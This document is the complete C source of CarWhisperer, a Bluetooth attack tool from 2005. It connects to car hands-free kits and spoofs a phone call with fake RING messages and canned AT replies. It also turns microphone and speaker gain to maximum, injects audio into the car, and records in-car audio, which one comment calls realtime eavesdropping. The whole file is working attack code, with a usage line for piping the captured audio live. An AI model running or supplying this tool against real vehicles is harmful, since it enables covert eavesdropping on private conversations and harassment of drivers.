/*
 *
 *  CarWhisperer - get to talk with other drivers (be nice)
 *
 *  adapted in July 2005 by Martin Herfurt <martin@trifinite.org>
 *  based on the test utility 'hstest' which has been developed by Marcel Holtmann
 *  and is provided via the 'bluez-utils' package and the BlueZ-CVS sourcetree.
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License version 2 as
 *  published by the Free Software Foundation;
 *
 *  Credits to: Joern Seger and Marcel Holtmann.
 *
 *  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 *  OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 *  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS.
 *  IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE FOR ANY
 *  CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY DAMAGES 
 *  WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN 
 *  ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF 
 *  OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 *
 *  ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS, 
 *  COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS 
 *  SOFTWARE IS DISCLAIMED.
 *
 */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <termios.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/sco.h>
#include <bluetooth/rfcomm.h>

static volatile int terminate = 0;

static void sig_term(int sig) {
	terminate = 1;
}

/*
 * rfcomm_connect
 * establish a rfcomm connection to a given channel at a given Bluetooth device address.
 */

static int rfcomm_connect(bdaddr_t *src, bdaddr_t *dst, uint8_t channel)
{
	struct sockaddr_rc addr;
	int s;

	if ((s = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM)) < 0) {
		return -1;
	}

	memset(&addr, 0, sizeof(addr));
	addr.rc_family = AF_BLUETOOTH;
	bacpy(&addr.rc_bdaddr, src);
	addr.rc_channel = 1;
	if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		close(s);
		return -1;
	}

	memset(&addr, 0, sizeof(addr));
	addr.rc_family = AF_BLUETOOTH;
	bacpy(&addr.rc_bdaddr, dst);
	addr.rc_channel = channel;
	if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0 ){
		close(s);
		return -1;
	}
	
	// set the NONBLOCK flag for the socket
	if (fcntl(s,F_SETFL,O_NONBLOCK)<0)
		perror("Cannot manipulate rfcomm socket.");

	return s;
}

/*
 * rfcomm_connect
 * establish a SCO connection to a given Bluetooth device address.
 */

static int sco_connect(bdaddr_t *src, bdaddr_t *dst, uint16_t *handle, uint16_t *mtu)
{
	struct sockaddr_sco addr;
	struct sco_conninfo conn;
	struct sco_options opts;
	int s, size;

	if ((s = socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_SCO)) < 0) {
		return -1;
	}

	memset(&addr, 0, sizeof(addr));
	addr.sco_family = AF_BLUETOOTH;
	bacpy(&addr.sco_bdaddr, src);

	if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		close(s);
		return -1;
	}

	memset(&addr, 0, sizeof(addr));
	addr.sco_family = AF_BLUETOOTH;
	bacpy(&addr.sco_bdaddr, dst);

	if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0 ){
		close(s);
		return -1;
	}

	memset(&conn, 0, sizeof(conn));
	size = sizeof(conn);

	if (getsockopt(s, SOL_SCO, SCO_CONNINFO, &conn, &size) < 0) {
		close(s);
		return -1;
	}

	memset(&opts, 0, sizeof(opts));
	size = sizeof(opts);

	if (getsockopt(s, SOL_SCO, SCO_OPTIONS, &opts, &size) < 0) {
		close(s);
		return -1;
	}

	if (handle)
		*handle = conn.hci_handle;

	if (mtu)
		*mtu = opts.mtu;
	
	// set the NONBLOCK flag for the socket
	if (fcntl(s,F_SETFL,O_NONBLOCK)<0)
		perror("Cannot manipulate SCO socket.");
		
	return s;
}

static void usage(void)
{
	printf("Usage:\n"
		"\tcarwhisperer <hci#> <messagefile> <recordfile> <bdaddr> [channel]\n"
	       "Realtime:\n"
		"\tcarwhisperer 0 out.raw - 00:11:22:33:44:55 | sox -t raw -r 8000 -c 1 -s -w - -t ossdsp /dev/dsp\n");

}

int main(int argc, char *argv[])
{
	struct sigaction sa;

	fd_set rfds;
	struct timeval timeout;
	unsigned char buf[2048], *p;
	unsigned char cmp[2048];
	int maxfd, sel, wlen, rlen;
	int cnt=0;
	bdaddr_t local;
	bdaddr_t bdaddr;
	uint8_t channel;
	uint8_t hcidevno;

	char *infilename;
	char *outfilename;
	mode_t infilemode;
	mode_t outfilemode;
  	int scostarted=0;	
	int mode = 0;
	int dd, rd, sd, fdi, fdo;
	uint16_t sco_handle, sco_mtu, vs;

	switch (argc) {
	case 5:
		str2ba(argv[4], &bdaddr);
		channel = 1;
		hcidevno = 0;
		break;
	case 6:
		str2ba(argv[4], &bdaddr);
		channel = atoi(argv[5]);
		hcidevno = atoi(argv[1]);
		break;
	default:
		usage();
		exit(-1);
	}

	infilemode = O_RDONLY;
	outfilemode = O_WRONLY | O_CREAT | O_TRUNC;

	infilename = argv[2];
	outfilename = argv[3];

	hci_devba(0, &local);
	dd = hci_open_dev(hcidevno);
	hci_read_voice_setting(dd, &vs, 1000);
	vs = htobs(vs);
	printf("Voice setting: 0x%04x\n", vs);
	close(dd);
	if (vs != 0x0060) {
		perror("The voice setting must be 0x0060!\n");
		return -1;
	}
	
	// Hack by KF to enable realtime audio eavesdropping. Use stdout and pipe to sox. (see usage)
	if(strcmp(outfilename,"-") == 0)
	{	
		printf("Using stdout!");
		fdo = 1;
	}
	else
	{
		if ((fdo = open(outfilename, outfilemode)) < 0) {
			perror("Can't open output file!");
			return -1;
		}
	}

	if ((fdi = open(infilename, infilemode)) < 0) {
		perror("Can't open input file!");
		return -1;
	}
	
	memset(&sa, 0, sizeof(sa));
	sa.sa_flags = SA_NOCLDSTOP;
	sa.sa_handler = sig_term;
	sigaction(SIGTERM, &sa, NULL);
	sigaction(SIGINT,  &sa, NULL);

	sa.sa_handler = SIG_IGN;
	sigaction(SIGCHLD, &sa, NULL);
	sigaction(SIGPIPE, &sa, NULL);

	if ((rd = rfcomm_connect(&local, &bdaddr, channel)) < 0) {
		perror("Can't connect RFCOMM channel!");
		return -1;
	}

	printf("RFCOMM channel connected\n");
	
	// It is important that the RING message is sent before the SCO connection is established.
	// This way, the audio sent is interpreted as in-band ringtone and is displayed in most cases
	// immediately.
	
	// send 'RING' message in order to initiate fake phone call 
	wlen = write(rd, "RING\r\n", 6);
	
	usleep(1000);

	if ((sd = sco_connect(&local, &bdaddr, &sco_handle, &sco_mtu)) < 0) {
		perror("Can't connect SCO audio channel!");
		close(rd);
		return -1;
	}

	printf("SCO audio channel connected (handle %d, mtu %d)\n", sco_handle, sco_mtu);

	// wait for connection to be fully established
//	usleep(200);

	// turn up the speaker volume and the microphone gain to the highest level
	wlen = write(rd, "AT+VGS=15\r\n", 11);
	wlen = write(rd, "AT+VGM=15\r\n", 11);
	
	// send 'RING' message in order to initiate fake phone call 
	wlen = write(rd, "RING\r\n", 6);


	maxfd = (rd > sd) ? rd : sd;

	while (!terminate) {

		FD_ZERO(&rfds);
		FD_SET(rd, &rfds);
		FD_SET(sd, &rfds);

		timeout.tv_sec = 2;
		timeout.tv_usec = 0;

		if ((sel = select(maxfd + 1, &rfds, NULL, NULL, &timeout)) > 0) {
		
			if ((FD_ISSET(rd, &rfds))&&(scostarted!=0)) {
				memset(buf, 0, sizeof(buf));
				rlen = read(rd, buf, sizeof(buf));
				//buf[rlen++] = '\0';
				if (rlen > 0) {
					fprintf(stderr, "got:  %s\n",buf);
                                        if (strncmp(buf, "AT+BRSF=",8)==0) {
						wlen=write(rd,"+BRSF: 63\r\n",11);
						fprintf(stderr, "ansewered:  +BRSF: 63\n");
					} else if (strncmp(buf, "AT+CIND?",8)==0) { 
						wlen=write(rd,"+CIND: 0,1,0,0\r\n",16);
						fprintf(stderr, "ansewered: +CIND: 1\n");
					} else if (strncmp(buf, "AT+CIND=?",9)==0) { 
						wlen=write(rd,"+CIND: (\"call\",(0,1)),(\"service\",(0,1)),(\"call_setup\",(0-3)),(\"callsetup\",(0-3))\r\n",82);
						fprintf(stderr, "ansewered: +CIND: (\"call\",(0,1)),(\"service\",(0,1)),(\"call_setup\",(0-3)),(\"callsetup\",(0-3))\n");
					} else {
						// answer to anything else with an 'OK'
						wlen = write(rd, "OK\r\n", 4);
						fprintf(stderr, "ansewered:  OK\n");
					}
				} else {
					// check return value of read call
					if (rlen==-1) {
						// terminate loop
						wlen = write(rd, "AT+VGM=15\r\n", 11);
						terminate=1;
					}
				}
			}
			
			if (FD_ISSET(sd, &rfds)) {
				scostarted=1;
				memset(buf, 0, sizeof(buf));
				rlen = read(sd, buf, sizeof(buf));
				if (rlen > 0) {
					wlen = write(fdo, buf, rlen);
					rlen = read(fdi, buf, rlen);
					wlen = 0; 
					if (rlen > 0) p = buf;
					while (rlen > sco_mtu) {
					        wlen += write(sd, p, sco_mtu);
					        rlen -= sco_mtu;
					        p += sco_mtu;
					}
					wlen += write(sd, p, rlen);
				}
			}
			if (cnt++>800) {

				// keep tuning up the volume for speaker and microphone
				wlen = write(rd, "RING\r\n", 6);
				wlen = write(rd, "AT+VGS=15\r\n", 11);
				wlen = write(rd, "AT+VGM=15\r\n", 11);
				cnt=0;
				printf(".\n");
			}
		}
	}

	// close sockets 
	close(sd);
	close(rd);

	// close files
	close(fdi);
	close(fdo);

	return 0;
}
